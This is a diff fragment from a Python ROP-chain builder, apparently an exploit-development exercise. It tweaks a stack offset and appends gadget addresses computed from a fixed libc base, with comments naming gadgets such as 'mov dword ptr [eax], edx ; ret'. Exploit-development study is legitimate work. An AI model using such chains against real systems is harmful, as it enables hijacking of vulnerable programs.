@@ -386,7 +386,7 @@ class ROP:
         #might be overcompensating in esp_delta, should only start counting after line 281??
         #print("PRINT: ", 0x37800000 + self.count + 6)       #0x378000D4 but esp_delta is 0x378000B0
         #sys.stdout.buffer.write((0x37800000 + self.count + 12).to_bytes(4, byteorder='little'))
-        self.arr += (0x37800000 + len(self.arr) + 6).to_bytes(4, byteorder='little')
+        self.arr += (0x37800000 + len(self.arr) + 7).to_bytes(4, byteorder='little')
         #sys.stdout.buffer.write((0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x000f4834 : mov dword ptr [eax], edx ; ret 
         self.arr += (0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little')
         #sys.stdout.buffer.write((0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x00098ffc : add dword ptr [eax], esp ; ret
